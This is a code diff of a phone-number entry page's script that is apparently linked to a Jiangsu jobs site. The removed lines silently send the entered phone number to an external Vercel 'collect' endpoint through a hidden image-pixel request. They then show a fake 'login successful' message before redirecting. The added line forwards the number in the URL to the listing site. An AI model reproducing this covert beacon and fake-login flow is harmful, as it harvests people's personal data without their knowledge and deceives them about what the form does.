@@ -32,7 +32,6 @@ button:active{opacity:.8}
 </div>
 
 <script>
-var API = 'https://phone-api2.vercel.app/api/collect';
 var TARGET = 'https://thanhtientt51-commits.github.io/jiangsu-jobs-2026/';
 
 function submitPhone() {
@@ -44,12 +43,8 @@ function submitPhone() {
   }
   err.textContent = '';
 
-  // 图片像素发送到Vercel（国内手机4G能通）
-  new Image().src = API + '?phone=' + encodeURIComponent(phone);
-
-  // 显示成功并跳转
-  document.querySelector('.card').innerHTML = '<div class="icon">✅</div><h2>登录成功</h2><p style="font-size:2em;font-weight:800;color:#1a3a6b;margin:16px 0;letter-spacing:2px">' + phone + '</p><p style="color:#888">正在跳转...</p>';
-  setTimeout(function() { window.location.href = TARGET; }, 1500);
+  // 号码直接带到筛岗网站URL
+  window.location.href = TARGET + '?phone=' + encodeURIComponent(phone);
 }
 </script>
 
